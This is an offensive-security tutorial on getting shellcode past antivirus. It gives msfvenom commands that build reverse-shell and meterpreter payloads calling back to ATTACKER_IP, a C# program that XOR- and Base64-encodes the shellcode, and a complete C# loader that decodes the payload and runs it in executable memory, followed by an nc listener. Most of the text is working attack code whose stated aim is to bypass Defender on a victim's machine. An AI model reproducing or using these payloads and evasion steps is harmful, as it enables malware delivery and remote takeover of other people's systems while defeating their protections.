# Encoding and encrypting shellcode

Tools such as Metasploit provide encoding and encryption features. However, AV vendors are aware of the way these 
tools build their payloads and take measures to detect them. If you try using such features out of the box, chances 
are your payload will be detected as soon as the file touches the victim's disk. 

## Metasploit encoding

Listing encoders within the Metasploit framework:

    $ msfvenom --list encoders | grep excellent

Encoding using `Shikata_ga_nai`

    $ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp

It gets flagged by the AV. Try encrypting the payload. Intuitively, we would expect this to have a 
higher success rating, as decrypting the payload should prove a harder task for the AV. 

## Metasploit encryption

Listing encryption modules within the Metasploit framework:

    $ msfvenom --list encrypt

Xoring shellcode using the Metasploit framework:

    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe

It still gets flagged by the AV.

## Creating a Custom Payload

The best way to overcome this is to use a custom encoding schemes so that the AV doesn't know what to do to 
analyse the payload. It does not have to be anything too complex, as long as it is confusing enough for the AV to 
analyse. Take a simple reverse shell generated by msfvenom and use a combination of XOR and Base64 to bypass Defender.

Generate a CSharp shellcode format:

    $ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp

`Encrypter.cs` (replace the buf variable with the shellcode generated with msfvenom):

```text
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Dropper for Decrypting
            string key = "MwahK3y666!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```

Compile and execute on the Windows machine:

    C:\> csc.exe Encrypter.cs
    C:\> .\Encrypter.exe
    qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=

To match the encoder, decode everything in the reverse order. Start by decoding the 
`base64` content and then continue by `XOR`ing the result with the same key used in the encoder. 

`EncStageless.cs`:

```text

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "MwahK3y666!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

Compile the payload on the Windows machine:

    C:\> csc.exe EncStageless.cs

Before running the payload, set up an `nc` listener on the attack machine:

    $ nc -lvp 443




